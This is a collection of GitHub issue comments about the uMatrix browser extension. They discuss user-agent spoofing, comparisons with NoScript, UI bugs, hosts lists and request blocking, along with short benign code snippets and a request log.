    "moulierac": "I'm so sorry.\nIt's with uMartix \nwhen i test here\nhttp://whoer.net/extended\nAl is good\nI have Firefox browser\nBut if enable javascript i have always Firefox\nBut vendor Google inc\nWith this we see the user , spoof user agent\nWith User Agent Switcher on the same site\nI have Safari browser\nAnd vendor Apple\nThanks\n. Thanks SARG04 for me same problem.\nThanks to d-kr like that i know is no solution.\ngorhill won't work on that.\nI respect it's a choice.\nBut it's too bad for user no spoof user agent works in fact.\nUse one and user it's suspect.\nTo easy for dedect.\nBest regarsd for all.\nAnd again thank you gorhill you're extension is wondeful.\n. Gentleman.\nYou are too technic for me.\ngorhiil i have don't want offend you.\nEnglish is bad for me ; sorry.\nI try what you said ; and don't work for me on whoer.extended.\nBut may be i do mystake in rules.\nSARG04 sorry i understand nothing.\nBut i see result\nIn fact no spoof user works perfectly.\nOr it's too difficult to do i don't know.\nBest regards.\n. gorhill\ntry\ndo not allow 3rd-party javascript to run at all \nblock all 3rd-party resources\nblocking XHR\nBy rules in uMartrix.\n. gorhill.\nI understand.\nI'm advanced user.\nBut no developer is advencer user is this for you.\nOf course i don't work for NASA  ;-)\nBut thank you.\nApologise for wast you're time.\nBest regards.\n. gorhill.\ni know now no.\nI' m little stupid i don't have think to verify if have in whoer.\nBut how know if the rules works.\nApologise again.\nThanks for you're patience.\n. ",
    "SARG04": "It seems there is a problem.\n(tested with uMatrix 0.9.1.3 in Firefox 38 and Chrome 43 )\nfor me this code returns the spoof user agent\nhttp://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_nav_useragent\nand this returns the real user agent\nhttp://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_nav_all\nSo if navigator.userAgent is used inside a function it works, but if not it don't.\n. My point was a little bit different. It seams to depend on the context in which navigator.userAgent is used, if it is spoofed or not.\n<!DOCTYPE html><html><body>\n <button onclick=\"test()\">Test</button>\n <div id=\"text\"></div>\n <script>\n  test()\n  function test() {\n    var x = navigator.userAgent;\n    document.getElementById(\"text\").innerHTML = x;\n   }\n </script></body></html>\nWhen you open the page it will show the real user agent. And when you click on Test it will show the spoofed one.\nAnd yes via feature detection it is mostly possible to detect the browser version (at least if JavaScript is enabled)\nhttps://html5test.com/compare/browser/mybrowser/chrome-43/chrome-42/firefox-38/firefox-37.html\n. > but this must be due to Chromium limitation\nJust want to let you know, it happens in Firefox 38 as well.\n. ",
    "h1z1": "Meh, I'll bite.   Removing the spoof is insane, it addresses an entirely different thing. \nNot every site uses international espionage grade analytics to track users.  Much like a lot of threads lately, the position you're taking is akin to forgoing SSL entirely because it's broken by design.\nNo one is denying uM or uB are advanced, what's somewhat infuriating is the number of \"bugs\" in browsers that are privacy / security nightmares but  buried under pointless bug report threads only to be closed as invalid.  They may be upstream but they certainly aren't invalid.\nPeople want to protest like Net Neutrality is the end of the world yet fail to acknowledge (aka, name and shame), who really supports making the Internet a miserable place.\ntl;DR - Rather then close bugs as invalid, why not make a list of sites known not to work?  There's no harm in shaming Facebook, Google, Microsoft or Mozilla for allowing it.\n. > I wouldn't call a few lines of code (eg for CSS line height) international espionage grade analytics. The number of sites grabbing metrics is huge, and growing. \nDon't follow that at all.  I was referring to the scope in which the data is gathered not difficulty.\n\nThankfully its almost always 3rd party. This is nothing to do with state actors - for that go and use Tor over VPN on Tails or whatever.\n\nWhich is one of the ways interception is done over Tor - with Tech companies quite involved in facilitating it.\n\nNo-one said to stop trying to defeat FP'ing where it is unavoidable. \nThere are dedicated extensions for UA (arguably most are not very \ngood), and there is privacy.resistFingerprinting.\n\ngorhill above did.   Why would I want to install more extensions?\n\nThe  point was that I think UA spoofing in uM is very bare bones,  incomplete, almost impossible to get right, a waste of gorhill's time,  and gives users a false sense of \"privacy\"\n\nThe same could be and frequently is said about much of what uM and uBO do which is one of my points.\n\nI have no idea what bugs being invalidated, net neutrality and all those corporation names have to do with this.\n\nBit of a shame, thought it was fairly clear.  They are deflecting from the real sources of those problems.   Quite a few of the companies are embattled in both.  \nI responded to this because it's one of many threads attempting to trivialize real privacy issues.  I'm well aware of how bad browsers are, I certainly don't sit behind intercepting proxies because I enjoy playing SSL accept bingo.   I do it because I don't trust the damn browser or OS.. Can confirm this on Palemoon 26.2.2, it randomly disappears.  Restarting the browser, cycling the plugin or re-adding it to the toolbar restores the icon.  \nuMatrix: 0.9.3.5\nuBlock: 1.7.6\n. Don't think posting links to porn are wise on Github.\nThe problem \n- sites are able to make requests that are not handled properly by uMatrix or uBlock.   Pornhub was the example, specifically the URL I gave (http://ws.00zasdf.pw/json)\n- uBlockOrigin identifies it as 3rd party and blocked but ONLY in the log.\n- uMatrix identifies it as other and permitted, again ONLY in the log.\nExpected behaviour \n- the request gets first noticed on the dashboard\n- the request shows up in the logger\n- correct disposition is selected based on filters\nI don't know what causes it nor do I have a repeatable test case.\nVersions: \n- Browser: Palemoon 26.2.2\n- uM: 0.9.3.5\n- uBO: 1.7.6\n- * Noscript / adblock are not installed *\n. What the fuck?   I gave you the site and URL...  My questions if it was normal or not.  Thanks, I think.\n. Ah my little napoleon complex friend..  It's not invalid, there's NOTHING indicating why one can't accept the certificate.   That is the bug.   Why I opened this - warn anyone else who might run into it.\n. Snapping?  Hardly,  I'm amused.  Honestly thought he would update the wiki or something to warn others. Not just close it as invalid.   I have no idea what switchboard is/was.\nDidn't say any code change was required, quite simply that it happens.  He did the same thing with my other bug, ironically enough had he said websockets aren't really filtered it would have been more productive.  Looking at other tickets I can see he just closes most of them.   Closed issues do not show up by default, I had nfi and still don't, what the relationship between UBM and SSL is.  I can say I spent the lesser part of two weeks trying to narrow it down.\nOnly people snapping are you two.\n. I don't see XHR but I do see images and they are blocked.  Then again I have first party blocked by default.\n- 1st-party image block\n- 1st-party other block\nThat is a pretty evil  page either way.  Why is it even possible?\n. Been going NUTS over this.  The only time I've run into it is in Chromium! (despite @gorhill above).  Interestingly enough if I do an inspection, I can restore temporarily by disabling justify-content in #toolbarContainer.   It moves the revert icon over   \nuMatrix 1.1.21.3. Played with this again, won't claim to know the backends of uM nor that what I'm seeing is related to this.    It appears though that changing the minimum displayTextSize in dashboard.html from 12 to 10, allows one to drop the font sufficiently enough that no clipping occurs.   Whether that is the best way I don't know.\n@gorhill was the intent of that feature meant to adjust scroll bars on the dashboard as well?  They don't appear for me unless I make other changes to the css in popup.. Read that as the opposite - It doesn't call home by default, that is a good thing.  Drove me nuts that uBO does this and without asking.   Default third party rules are dangerous.. >> It doesn't call home by default\n\nIt never calls \"home\", I don't own GitHub servers.\n\nExtended home? :)   Never said your home though.  Will uM not download them on first run?\n\n\nDefault third party rules are dangerous.\n\nThey are all block rules\n\nIndeed, they are  run by third parties though.. Same could be said the other way - If the default is deny then why are these needed?  Blocking 3rd party anything is the point of umatrix.  There's nothing to stop them from including rules I'd rather not waste even memory on or risk typos breaking (easylist for example).  Considering 99% of them are never hit..\nUnlike running a dns server, hosts files are not databases.  There is an overhead in reading pointless, large files over and over.\nI don't personally need nor care for yet another server somewhere on the Internet keeping a record of me.  I much rather software ASK on install whether users want to download external lists first.  . > To block css and images from those known bad domains, even when they are allowed globally.\nThat is exactly why those lists are to be vetted personally.\n\nAnd in some cases content from those domains is 1st-party scripts /XHR/etc (subdomain). Privacy.\n\nDon't think you understand what default deny means as it includes 1st and 3rd party requests.  It is a bit more laborious but worth it considering realistically you only visit a small subset of sites.\n\nTo clean up matrix via moving them to the end of popup, plus making it possible to hide all of them to one string. Usability.\n\nI don't understand that.  . FUD?  My point was the lists are now going to be enabled by default.  Whether users choose to use them or not is entirely their own.  Regarding the interface itself, I prefer the second image. \nDon't know where you guys get this but I expect you'll restrict and lock this thread like you usually do.  Screenshots taken.  . > Just make a convincing argument as to why adding more block rules on top of whatever ruleset is in effect is \"dangerous\".\nWhy on earth would I do that?  It wan't my argument at all.\nKeep making threads like this though and you answer your own question.. ",
    "orbisvicis": "Sometimes: \"Furthermore, NoScript's sophisticated InjectionChecker engine checks also all the requests started from whitelisted origins for suspicious patterns landing on different trusted sites: ...\"\nSo if you allow a script from a 3rd party site (trusted) which is later compromised, noscript claims be likely to detect that. Also, if the malicious script is entirely embedded within the 1st party site (is this technically xss?), then noscript can be configured to detect that by setting noscript.injectionCheck to \"check every request*.\nPlugins that try to do too much screw over users when they become partially obsolete. I wish noscript's \"InjectionChecker\" engine would be repackaged as a standalone extension.\nKinda uncertain regarding umatrix'es unrelated settings (strict https, spoof user agent, clear browser cache, delete non-blocked session cookies).\nAnyway noscript can be run in \"allow scripts globally mode\" to access its ancillary features such as XSS/CSRF protection.\nedit: actually, I don't think noscript's ABE provides any additional CSRF protection over umatrix, if you properly block the correct xhr 3rd parties.\n. If umatrix is used with noscript in \"allow scripts globally mode\", then \"cascade top-level document's permissions to third-party sites\" has no effect, I presume?\n. ",
    "ThrawnCA": "If you're going to use NoScript and \u00b5Matrix together, then you might want to consider setting NoScript to \u2018Cascade top-level document's permissions to third-party sites\u2019.\n. Correct. Allowing scripts globally makes most of the other script settings redundant.\nHowever, cascading permissions might be a better choice when combining with uMatrix. Then, NoScript will control the permissions of the top-level site (including inline scripts), and once it's allowed, uMatrix will control all the third parties.\n. Does that cover inline scripts? If so, it's pretty close.\nI believe uMatrix doesn't handle data: URIs, though? PoC at http://evil.hackademix.net/hsb/\nAlso, NoScript has the option to distinguish protocols (eg only allowing the HTTPS version of a site to run scripts).\n. \"So if you allow a script from a 3rd party site (trusted) which is later compromised, noscript claims be likely to detect that.\"\nWell, it depends on what kind of \"compromise\" you mean. That's not really what XSS is about.\nThe much more likely scenario is: you trust bank.com, but it turns out to have a weakness that allows random.com to send crafted requests that execute scripts in the context of bank.com, reading your session cookies and making transactions on your behalf. NoScript claims to be good at catching the crafted requests and neutralising them.\nuMatrix has a very good chance of catching the attack, too, because why would you have allowed random.com to send requests to bank.com? Although if you're in the habit of switching off the matrix for some sites, then you may have trouble.\n\"Also, if the malicious script is entirely embedded within the 1st party site (is this technically xss?)\"\nCertainly it is. It's called Persistent XSS, aka type 2 (I think), and it's quite nasty (Samy worm anyone?). Typically happens on sites like wikis or forums (or Github?) that store and display snippets of user-provided content.\nNoScript can't catch it directly, since the crafted request happened earlier in the attacker's session. However, such attacks typically have limited space, so they rely on pulling down payloads from other sites. Which will probably not be trusted, so the attack would fail.\n\"I wish noscript's \"InjectionChecker\" engine would be repackaged as a standalone extension.\"\nWell, it's GPL-licensed, so feel free...although there is an advantage to incorporating it within NoScript itself. Putting every request through InjectionChecker has overheads. NoScript reduces this by applying a simpler and harsher check to requests originated by untrusted sites.\n. NoScript is GPL-licensed, if its source would be helpful, and there is an unofficial Git repo at https://github.com/avian2/noscript\n. Excellent point about cookies, I overlooked that column.\nStripping POST bodies is more of a security safeguard, I guess, rather than general content blocking. NoScript routinely does this whenever sites that are not on its whitelist send cross-site POST requests. It effectively disarms many CSRF/XSS attacks. Less important, of course, when you're fully controlling the matrix of cross-site requests with a default-deny.\nAny chance of affecting Authorization headers? It might even make sense to strip them whenever cookies are stripped, as a special case (they're two different types of authentication headers, really).\n. Yes, your recapitulation is correct. In case it wasn't clear, the reason for asking for this option is that falling back on browser default behavior and making no changes to the DOM means that blocking detection requires JavaScript and it becomes impossible for a web page to figure how or where the blocking was done: there would be no way to tell that something in the browser is doing the blocking vs a network error or \"error ;) \" of some sort.\nBy contrast, changing the web page's DOM necessarily means that there is a CSS selector that can detect the change and thus pure CSS can alter the page's look & behavior in undesirable ways. (I think barbaz at informaction sent you a PM there with more info)\nAlso some text was stripped out of the CSS selector, that was supposed to say [src=\"original_image_src\"]\nAnd probably should have said \"it can still be detected by the web page that something in the browser blocked the image load\" in the description.\n. ",
    "haasn": "I've worked around this issue by making my own custom style-sheet that contains the colors from the popup.css but with !important after each attribute.\nHowever, this does not seem to work on the images (background-image). Any ideas?\nEdit: I realized I could use base64-encoded data URIs to work around this problem.\n```\n.matCell.p81 {\n    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAATBAMAAABW2/GaAAAAA3NCSVQICAjb4U/gAAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAA9QTFRF////////9c7OzAAA1S0tO6xHowAAAAN0Uk5TAC3Wtezp0AAAACxJREFUCNeVxzEBACAMwLBKmAU0FAXzL4qjCsgXVO9BdYdCoVAoFAqFQvn2ABDhB3FgorvJAAAAAElFTkSuQmCC) !important;\n}\n.matCell.p82 {\n    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAATBAMAAABW2/GaAAAAA3NCSVQICAjb4U/gAAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAA9QTFRF////////uN64AIgAJZklO3jCCwAAAAN0Uk5TACXIhzpeuwAAACxJREFUCNeVxzEBACAMwLBKmAU0FAXzL4qjCsgXVO9BdYdCoVAoFAqFQvn2ABDhB3FgorvJAAAAAElFTkSuQmCC) !important;\n}\n```\n. Similar issue here. I moved the uMatrix icon to the addon bar (the one at the bottom), and it works \u201cfine\u201d there (the dashboard opens at the bottom, too, where I'd expect it), but as soon as I hide the toolbar again it simply stops showing up.\nI'd personally expect something like this to be available from the context menu (like NoScript / RequestPolicy), if that would be at all possible. (Just an entry to open up the dashboard would be fine)\nEdit: I've decided to move this to a separate issue, #288, because it's not really a complaint about the UI but rather a bug in its own right.\n. > You can invoke the popup from the logger.\nInterestingly enough, this also solves my issue, even though it may have been somewhat orthogonal - if opening the popup from the logger, it works fine even with the toolbar disabled.\nNow I just need to bookmark the logger or something and I can avoid having to constantly turn the toolbar on and off again just to access umatrix. :p\n. Thanks, that fixes my issue perfectly.\n. ",
    "Geremia": "@vdcbb See the Perl script here for converting EasyList to a hosts file.. @orodeshah See the Perl script here for converting EasyList to a hosts file.. @gorhill This \"issue\" couldn't fall under \"feature request\"?. @gorhill  I found this: https://github.com/gorhill/uBlock/wiki/FAQ#can-ublock-origin-filter-youtube-ads\nthanks\nSo the lists I'm using don't include a rule that successfully blocks YouTube video ads. So, yes, this is not a \u00b5Matrix issue. (I'm not using EasyList.). ",
    "gooly": "Yes uMatrix is installed. I use FF 38.0.5 but now I have found the green spot in the Menu. I haven't expected that uMatrix places it's spot there by itself, while I arranged all the icons myself..\n. ",
    "jeremykohn": "There's also a useful overview of blocking and exceptions (here) on the wiki for the old httpswitchboard.\n. ",
    "spaghetti2514": "\nDuplicate #271, #118\n\nI would suggest that you actually read issues before declaring them duplicates. This request has nothing to do with user agents\n. > gorhill's second answer in 271 already talks about fingerprinting,the navigator object in general and why he does not extend the spoofing much futher. I assumed it applies here too.\nIt's entirely possible that it does, but I'd rather Gorhill say that himself than have you \"assume\" it.\nFurther, if it's actually Gorhill's stance that the important part of preventing fingerprinting is preventing third party scripts and XHR entirely, then why is the user agent spoofer in uMatrix at all?\nThe help text for the user agent spoofer setting in uMatrix's option page says\n\nyour browser sends a \u2018User Agent\u2019 header to the website saying precisely which operating system and web browser you are using. This information could help distinguish Internet users from one another because these versions differ, often considerably, from person to person\n\nThat's fingerprinting in a nutshell. Based on that, it would seem to be that Gorhill has at least some interest in preventing fingerprinting through spoofing, and plugin enumeration is the next most substantially helpful way to achieve that.\n\nI commented in them.\n\nI was referring to this issue\n. ",
    "quilloss": "I would expect about:addons to result in addons.about-scheme and chrome://ublock0/content/dashboard.html to result in ublock0.chrome-scheme.\nAt least if I go by uMatrix 0.9.1.2 behavior.\nAlso https://github.com/gorhill/uMatrix/blob/master/src/js/tab.js#L72-L78\n```\n    var fakeHostname = scheme + '-scheme';\nif ( uri.hostname !== '' ) {\n    fakeHostname = uri.hostname + '.' + fakeHostname;\n} else if ( scheme === 'about' ) {\n    fakeHostname = uri.path + '.' + fakeHostname;\n}\n\n``\n. Could the issue be due to the changes fortabWatcher` in d6a48df60162a2f0b4465c4bea5b477cde06cadd.\nuMatrix 0.9.1.2\nWhen navigating from about:blank to https://github.com/gorhill/uMatrix, 2 calls to TabContext.update is made. The call stack shows that the first came from httpObserver.observe and the second from tabWatcher.onLocationChange.\nWhen navigating from about:blank to about:memory only the call originating from tabWatcher.onLocationChange is present.\nuMatrix 0.9.1.3-dev.3\ntabWatcher.onLocationChange is no longer there.\nNavigating from about:blank to about:memory results in no call to TabContext.update.\nBasically any navigation to an about:[...] will result in no call to TabContext.update.\n. Not sure if this is related but uMatrix and uBlock popups flickers every time they are opened in Firefox Windows. It looks like it tries to resize the popup twice during the opening animation.\n. > Is this network request made from within the behind-the-scene scope?\nuBlock says behind-the-scene, uMatrix says tab scope, and Firefox logged it in the page's network inspector.\n\nAlso, from which URL did you click the link to Twitter?\n\nThe URL on this page does not work? I managed to reproduce the issue on a clean profile using this issue page.\n. But won't this information \"referrer\":\"https://github.com/gorhill/uMatrix/issues/320\" be considered a leak. Why would it be part of the JSON payload if there is no content from Github even present on the page?\nAgain setting network.http.referer.XOriginPolicy = 1 would make this section become \"referrer\":\"\".\n. Can't you just block all application/json request to the report-uri if it is present. If you want to be extra sure, double check the JSON for the \"csp-report\" key. Though that may result in logger spam.\n. > I am of the opinion a bug should be opened on bugzilla\nOk, bug opened at https://bugzilla.mozilla.org/show_bug.cgi?id=1194970. I hope I got all the details right.\n\nLooks like Firefox's CSP-report-uri feature relies on the original CSP header, never on the modified one.\n\nDid you mean the report-uri relies on the original referrer header instead of the original CSP header? Because when I removed the report-uri from the CSP header using nsIHttpChannel.setResponseHeader Firefox stop firing those reports.\n. ",
    "AdKiller": "at this point I am willing to pay to get keyboard shortcuts in Firefox.\nhttps://github.com/gorhill/uMatrix/issues/453\n. yes please, keyboard shortcuts for every common task. I'm dying here with clicking the mouse...\n. -CLOSED-\n0_O\n. Apologies for the misuse of the issue tracker.\nThank you very much. I have a good enough understanding now, but still I'm not entirely sure about the meaning of the DARK RED triangle on a LIGHT RED frame cell. So it would means: a permanently blacklisted matrix which is also temporarily blacklisted? That can't be what it is.\n. It is not limited to the usage of the said website. It brings down the whole Firefox browser, surely that is not intended purpose of uMatrix?!\n. praying for the day uMatrix finally gets keyboard shortcuts... I am willing to pay for its development. . ",
    "nguillermin": "Solution works, thanks!\n. ",
    "jagan-veeraraghavan": "That worked. Thanks for the help.\n. ",
    "lukestanley": "It's close but that wouldn't help if some HTTP content was desired or if using a non-HTTPS main document.\n. Is this due to the a concern with making the UI too busy? Because if so, people may prefer the ability to control execution of HTTP vs HTTPS scripts over other types like images etc.\nA related idea might be better exposure of Strict HTTPS mode, perhaps getting rid of the padlock icon that may confuse users.\nI don't know if it's best to close this or leave it open, or maybe label it \"free to take and work on it\".\nBTW thanks for all the great work anyhow.\n. ",
    "Tharn": "The threat you're under while browsing websites has been grossly overstated. Most people run only an adblock solution and they're fine. Firewalls like uMatrix are great because they're more elegant. They can do without massive block lists and they block sniffer scripts (and in rare cases, dangerous stuff) in the same stroke. Power users love that. But it's mostly about annoyances and unruly websites, not real security threats.\nYes, I'd ditch NoScript simply because it has a noticeable impact on website loading speed. uBlock for cosmetic filtering & uMatrix for everything else works better.\n. NoScript slowed my page rendering speed down considerably. I didn't benchmark it, but it was obvious enough to notice an eyeball difference to having it turned off. Give it a go yourself, YMMV.\n. I'm assuming since both extensions came from the same flock, there is no functional or performance difference depending on who catches what first? I'll close this, cheers.\n. As far as I know, the closest relative to Palemoon 25.5 is still the Firefox ESR 24.8.1.\n. If you wanna go through the trouble of doing it manually,\nthere is an installer here: http://linux.palemoon.org/download/installer/\ntar.bz2 files here: http://linux.palemoon.org/download/mainline/\ninstructions for the latter here: http://linux.palemoon.org/help/installation/\n. Same here. And check out what it's doing in Firefox 28. The menu looks okay for a split second, then aligns itself to the right. It does this in windowed and maximized mode. Still flickers, too: http://i.imgur.com/CJBZIMg.png\nThis leads me to believe it might have something to do with the extension trying to align itself properly relative to the FF window and/or the screen.\n. With rc1, in Palemoon I get an occasional single twitch when selecting an item in the menu, but otherwise the UI is solid and useable.\nFirefox 28 still aligns itself to the right side, even if it means that most of the menu will be off-screen.\n. Nevermind, I didn't look at the release notes for the beta. Disregard please.\n. ",
    "ImSpecial": "Personally I would keep doing what your doing, keep NoScript for the added protection, at least until Flash is made completely obsolete and is not needed anymore (for exmaple twitch.tv), or until one day when (hopefully) gorhill will add in XXS/Clickjacking protection into ublock/umatrix to make NoScript really obsolete. I can dream.\n. Another thing NoScript has over uMatrix I like is by middle clicking the domain you can quickly lookup it's WOT scorecard for additional information on what it is about.\n@CrisBRM do you have benchmarks of NoScript vs uMatrix? You say lower performance, how much?\n. I get this too, when I start my browser (FF 57.0) and my homepage loads (DDG) it shows as if it's disabled, if I refresh the page it appears to work again.\nOn a fresh boot.\nhttps://i.imgur.com/RHFvB45.png\nRefreshed the page.\nhttps://i.imgur.com/rvepqgL.png\nI want to say this all started happening with either v1.1.8 or v1.1.10.\n. ",
    "360up": "Currently using uM, NS, RP(Continued) & ABP and scratching my head how to simplify things.\n- I could ditch uM and just use NS ABE feature or even ABP advanced rules instead, but I love the Matrix handling too much, it's sooo convenient. Cudos for that ingenuity @gorhill!\n- I could ditch NS, but uM/uB/ABP don't completely disable scripts, which results in pages or parts thereof not displaying correctly (e.g. #260).\n- I could ditch RP, but I like how it completely removes scopes on a content level, so blocked domains don't even make it into the adblock filter. It keeps things clean!\n- I could ditch ABP for uB, but the \"blockable items\" feature provides so much more functionality than the interface or logger of uB\nIt just can't be right to run this overcomplicated setup for the sake of those 4 features. I don't care so much about performance but functionality. I can't quite see how to miss out any of them.\nI guess I'm stuck...\n. > > Is there no way to provide a scope for a single domain level w/o sublevels?\n\nNo.\n\n@gorhill\nIs that something you think about changing? If not why not?\n. ",
    "seth100": "@berrythesoftwarecodeprogrammar what other thing does NoScript have that uMatrix does not?\n. @berrythesoftwarecodeprogrammar could you please share the test page? Thanks\n. ok, is there any way to do the job in one click (something like a switch button, maybe using an extension)? I'd like to set another language not for all pages.\n. Thanks I'll try that, but I will search for a open source extension like uMatrix that does that.\nI'd like this feature to become a uMatrix feature. What do you think? Is it possible? \n. Thanks, I also found this: https://github.com/dillbyrne/random-agent-spoofer\nI think it's good and has features that I think could also be added in uMatrix.\n. Ok thanks\n. great, thanks\n. ",
    "kerframil": "Here is a small video (194K), demonstrating this horizontal shift effect.\nhttps://dl.dropboxusercontent.com/u/32559805/v/umatrix-jitter-in-palemoon.mp4\nThis clip has a low frame rate, making the effect look less severe than it actually is. Further, it becomes better or worse depending on the relative position of the uMatrix icon within the toolbar.\n. In terms of UI behaviour, Firefox 24 should be the closest match. Although the focus is on the Windows builds, Pale Moon should build and run fine in Linux. I used it a few months ago in an Arch Linux VM without issue.\nThere's also a build script provided by the PM4Linux-installer project here on GitHub.\nMany thanks for the effort, by the way.\nEDIT: Removed SourceForge link. I can't find any other mirror for the binary distribution.\n. I installed Firefox 24.8.1 in Windows and can reproduce the issue there.\n. It doesn't quite fix it. Upon opening the popup, it will still occasionally jump to the right then left again. The same applies upon clicking any clickable element within the popup window. The chances of it shaking appear to continually vary. Sometimes, it will happen on the first click then three or four times in a row. Sometimes, it takes a dozen repeated clicks to trigger. When it does occur, it doesn't continually shake until the popup is closed, as was happening before. In that respect, it's definitely an improvement.\n. > I looked at your mp4 again, because as said now the popup will resize only if needed. From what I see in the video, the matrix is not resized, so I don't know from where that glitch comes from, there is something else at work than resizing in there. It's as if there is some kind of window snapping going on, I can't quite tell since the video crops the right part which is where something seems to be going on.\nThe window was maximized, hence no cropping on the top or right-hand side. I've prepared another clip in which the window is positioned so that its right-hand border is far from the right-hand edge of the desktop.\nhttps://dl.dropboxusercontent.com/u/32559805/v/umatrix-dropdown-no-forced-alignment.mp4\nThis clip demonstrates two things. Firstly, the drop-down is left-aligned relative to the toolbar button, not right-aligned (as it is in the Chrome version). Secondly, the shaking does not occur.\nI am certain that these two facts are related. The drop-down never overflows past the right-hand side of the desktop, instead being forced to the left if needs be. Only then does the shaking occur. Should it be possible to align the drop-down similarly as with Chrome, I think that it will be enough to mitigate this issue.\n. ",
    "drm200": "Ok, I understand the problem.   It would be nice if I could add some additional host sites using something similar to how you have implemented the ability to add additional spoofing agents without a text file.  But understand if not a priority.\nAlso, I was not able to see any errors in the uMatrix error log when trying to load file:// ... This reports nothing with chrome running under ubuntu for me.\nDuring this testing I was able to crash the plugin under this scenario:\nFirst I add the local url for my hosts file: \nfile://home/user1/Desktop/MyHosts.txt and then click \"parse\"\nNext, I deselect ALL other hosts files so that only my hosts file is selected and then click \"Apply Changes\", The extension will then hang.\nInterestingly, If I have at least one other hosts file \"selected\" ... there is no failure when I click \"Apply changes\".  \nThis is a rather esoteric error of no importance, I only relate the experience to you.\n. Yes, I see the same in the extension's dev console now.\nMany thanks,\n\nYou have to look in the extension's dev console\n. I missed that.  Thanks.\n. I had the same problem.  I am using Chrome in  ubuntu.  I was unable to get YouTube to go full screen.\nIf I unload the umatrix extension in chrome the problem goes away.\nIf I reload the umatrix extension in chrome then the problem returns.\nIf I disable umatrix filtering for the youtube scope ... the problem remains .... \n\nDisabling UA spoofing fixed the problem.  I only post this here to help anyone else who was struggling to find the solution.\n. ",
    "spartanhooah": "Sorry for being a regular user using this, I guess. I've restarted Firefox, and now I can send/reply from the extension popup accessed via the toolbar icon, but not the popup that appears when someone texts me. Here's the logger's output when I got a text and tried to reply:\n15:56:36            xhr https://api.pushbullet.com/v3/set-app-state\n15:56:36            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjAzB10eZga_threads\n15:56:36            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjzX6H2Gtga_threads\n15:56:27            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjAzB10eZga_threads\n15:56:27            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjzX6H2Gtga_threads\n15:56:26            xhr https://zebra.pushbullet.com/\n15:56:26            xhr https://api.pushbullet.com/v2/ephemerals\n15:56:26            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjAzB10eZga_threads\n15:56:26            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjzX6H2Gtga_threads\n15:56:24            xhr https://api.pushbullet.com/v2/permanents/phonebook_ujxMVQfJMlgsjAzB10eZga\n15:56:24            xhr https://api.pushbullet.com/v2/permanents/phonebook_ujxMVQfJMlgsjAzB10eZga\n15:56:24            xhr https://api.pushbullet.com/v3/set-app-state\n15:56:24            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjAzB10eZga_threads\n15:56:24            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjzX6H2Gtga_threads\n15:56:24            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjAzB10eZga_threads\n15:56:23            xhr https://api.pushbullet.com/v3/set-app-state\n15:56:23            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjAzB10eZga_threads\n15:56:23            xhr https://api.pushbullet.com/v2/permanents/ujxMVQfJMlgsjzX6H2Gtga_threads\nI can't find anything on the GitHub page about the behind-the-scenes matrix, so I can't speak to that.\n. I suppose it's possible. I'll try disabling uMatrix and see what happens.\n. Disabling uMatrix allows Pushbullet to work fine. I've got Firefox set to never allow third-party cookies.\n. ",
    "IV2KBMoFxYIA": "Try this: \nGo to the logger, and select \"Behind the scene\" from the drop down menu. Try using the Pushbullet extension. \nYou should see the listings that you mentioned before. Now click on the eye icon to the right of the time. \nYou should now see the matrix for the 'behind-the-scene' scope. \nGo through the list and allow anything related to push-bullet. \nPersonally, I have ALL css/images/xhr and other allowed for the 'behind-the-scene' scope. \nTry that and it should work. Otherwise, I recommend that you ask over at the user-side forum (http://goo.gl/6f1Ejb) instead of here which is more for bugs. \n. ",
    "Manouchehri": "Will do, wasn't sure how the translation was supposed to work.\n. Done, only changed the en version this time.\n. Is it currently being blocked purely because of the install.rdf, or is there another thing blocking it? I wouldn't mind trying it out even if it's somewhat unstable/unusable.\n. Ah, thanks for explaining. Is there enough removed that it flat out won't run, even without a proper UI? At the moment I'm mostly using uMatrix to handle enforcing strict HTTPS with a few exceptions, so it would still be quite useful with just the dashboard.\n. ",
    "defkev": "+1 for Android Support\n. Sorry but i am not following that logic.\nDisabling/Enabling spoofing (User agent, referrer) already triggers the padlock.\nSince you can configure this as a rule (per domain, sub domain) anyway:\nua-spoof: github.com false\nreferrer-spoof: github.com false\nSo imho it would just make sense that enabling/disabling the whole matrix should (temporarily) disable this as well: \nmatrix-off: github.com true\nBut you caught me for not searching the closed issues.\nShame on me..yada yada\n. I work with a lot of different admin panels, to many and to fast paced that i care about whitelisting everything, so i just disable the matrix globally temporary.\nSince i am not bothered about my privacy nor have to deal with advertising here because i am usually the one running them.\nOn one of these i noticed that the logon session is somewhat tied to the user agent, thus kicking me out every five minutes the user agent changes, which is annoying.\nIt of course depends on the situation the user is dealing with. Considering that uMatrix is meant to be used on the internet instead of a intranet it makes no sense to sacrifice privacy for usability.\nPoint taken.\n. ",
    "orklah": "Thank you for your very quick answer!\nIt works fine with the space after the #. Thank you.\nFor the file, I understand. Would it be possible to sync with an external file the same way we sync hosts files? That way I could keep my file updated, knowing that the rules will be imported in whatever order needed.\nI may be asking a lot for a simple issue. Feel free to close this issue if it's too much a bother to develop.\nThanks again!\n. @dllud I had a few experiences where a sensible page was useless because some content was blocked when using another addon which force auto refresh. When refreshing the page, a token must have been used and I couldn't use the page correctly anymore (It was on an online shop, all my cart was lost...).\nHowever, I'm in favor of implementing the same functionnality as uBlock when disabling the addon for a page: a big refresh button easy to reach.\n. ",
